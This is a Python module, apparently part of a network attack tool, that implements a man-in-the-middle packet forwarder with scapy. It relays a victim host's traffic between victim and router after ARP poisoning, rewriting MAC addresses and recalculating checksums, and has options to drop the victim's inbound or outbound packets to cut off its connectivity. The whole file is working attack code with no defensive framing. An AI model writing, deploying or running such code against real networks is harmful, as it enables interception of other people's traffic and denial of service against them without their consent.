"""User-space MITM packet forwarder with selective drop capability."""
import logging
from scapy.all import IP, Ether, AsyncSniffer, conf
from typing import Optional, Callable

log = logging.getLogger(__name__)


class MitmForwarder:
    """
    Simple user-space forwarder that optionally drops traffic in one direction.
    It assumes ARP poisoning is already in place so frames arrive at our NIC.
    Uses persistent L2 socket to avoid Windows socket exhaustion.
    """

    def __init__(self, debug: bool = False) -> None:
        self.running: bool = False
        self.sniffer: Optional[AsyncSniffer] = None
        self.victim: Optional[dict[str, object]] = None
        self.router: Optional[dict[str, object]] = None
        self.iface: Optional[str] = None
        self.my_mac: Optional[str] = None
        self.drop_from_victim: bool = False
        self.drop_to_victim: bool = False
        self._pkt_count: int = 0
        self._drop_count: int = 0
        self._fwd_count: int = 0
        self._debug: bool = debug
        self._socket: object = None  # Persistent L2 socket

    def start(
        self,
        victim: dict[str, object],
        router: dict[str, object],
        iface_name: str,
        iface_mac: str,
        should_drop: Optional[Callable[[object], bool]] = None,
        drop_from_victim: bool = False,
        drop_to_victim: bool = False,
    ) -> None:
        """
        Start capturing traffic for victim/router and rewrite MACs before sending.
        """
        self.stop()
        self.victim = victim
        self.router = router
        self.iface = iface_name
        self.my_mac = iface_mac
        self.drop_from_victim = drop_from_victim
        self.drop_to_victim = drop_to_victim
        self.running = True

        if not (self.victim.get('ip') and self.victim.get('mac')):
            log.warning('Victim information incomplete; not starting')
            self.running = False
            return
        if not (self.router.get('ip') and self.router.get('mac')):
            log.warning('Router information incomplete; not starting')
            self.running = False
            return

        # Create persistent L2 socket
        try:
            self._socket = conf.L2socket(iface=self.iface)
            log.debug('L2 socket created for %s', self.iface)
        except OSError as e:
            log.debug('Failed to create L2 socket: %s', e)
            self._socket = None

        bpf = f"ip and host {self.victim['ip']}"
        log.debug('Starting on %s', self.iface)
        log.debug('victim=%s/%s', self.victim['ip'], self.victim['mac'])
        log.debug('router=%s/%s', self.router['ip'], self.router['mac'])
        log.debug('drop_from_victim=%s, drop_to_victim=%s', self.drop_from_victim, self.drop_to_victim)
        try:
            self.sniffer = AsyncSniffer(
                iface=self.iface,
                filter=bpf,
                prn=self._process_packet,
                store=False
            )
            self.sniffer.start()
            log.debug('Sniffer started successfully')
        except OSError as e:
            log.warning('Sniffer failed: %s', e)
            self.running = False
            self.sniffer = None

    def stop(self) -> None:
        """Stop sniffing and close the persistent socket."""
        if self.sniffer:
            try:
                self.sniffer.stop()
            except OSError as e:
                log.debug('Sniffer stop error (ignoring): %s', e)
            self.sniffer = None
        # Close persistent socket
        if self._socket:
            try:
                self._socket.close()
            except OSError as e:
                log.debug('Socket close error (ignoring): %s', e)
            self._socket = None
        self.running = False
    
    def get_stats(self) -> dict[str, object]:
        """Return current packet statistics"""
        return {
            'running': self.running,
            'packets_seen': self._pkt_count,
            'packets_dropped': self._drop_count,
            'packets_forwarded': self._fwd_count,
            'drop_from_victim': self.drop_from_victim,
            'drop_to_victim': self.drop_to_victim,
        }

    def _process_packet(self, pkt: object) -> None:
        if not self.running or not pkt.haslayer(IP) or not pkt.haslayer(Ether):
            return

        ip_layer = pkt[IP]
        src = ip_layer.src
        dst = ip_layer.dst
        self._pkt_count += 1

        # Debug first few packets
        if self._debug and self._pkt_count <= 5:
            log.debug('pkt#%d: %s -> %s', self._pkt_count, src, dst)

        # Outbound: victim -> router/internet
        if src == self.victim['ip']:
            if self.drop_from_victim:
                self._drop_count += 1
                if self._debug and self._drop_count <= 3:
                    log.debug('DROPPING outbound: %s -> %s', src, dst)
                return  # packet dies here
            pkt[Ether].src = self.my_mac
            pkt[Ether].dst = self.router['mac']
            self._fix_checksums(pkt)
            self._send(pkt)
            self._fwd_count += 1

        # Inbound: router -> victim
        elif dst == self.victim['ip']:
            if self.drop_to_victim:
                self._drop_count += 1
                if self._debug and self._drop_count <= 3:
                    log.debug('DROPPING inbound: %s -> %s', src, dst)
                return
            pkt[Ether].src = self.my_mac
            pkt[Ether].dst = self.victim['mac']
            self._fix_checksums(pkt)
            self._send(pkt)
            self._fwd_count += 1
        
        # Periodic stats
        if self._debug and self._pkt_count % 100 == 0:
            log.debug('stats: %d seen, %d dropped, %d fwd', self._pkt_count, self._drop_count, self._fwd_count)

    def _send(self, pkt: object) -> None:
        """Send using persistent socket, prevents Windows socket exhaustion."""
        try:
            if self._socket:
                self._socket.send(pkt)
            else:
                # Fallback (shouldn't happen normally)
                from scapy.all import sendp
                sendp(pkt, iface=self.iface, verbose=0)
        except OSError as e:
            log.debug('Forwarder send failed: %s', e)

    @staticmethod
    def _fix_checksums(pkt: object) -> None:
        """Force recalculation of IP/TCP/UDP checksums after MAC rewrite."""
        try:
            if IP in pkt and hasattr(pkt[IP], 'chksum'):
                del pkt[IP].chksum
            if IP in pkt and hasattr(pkt[IP], 'len'):
                del pkt[IP].len
            if pkt.haslayer('TCP') and hasattr(pkt['TCP'], 'chksum'):
                del pkt['TCP'].chksum
            if pkt.haslayer('UDP') and hasattr(pkt['UDP'], 'chksum'):
                del pkt['UDP'].chksum
        except (AttributeError, IndexError) as e:
            log.debug('Checksum fix error: %s', e)
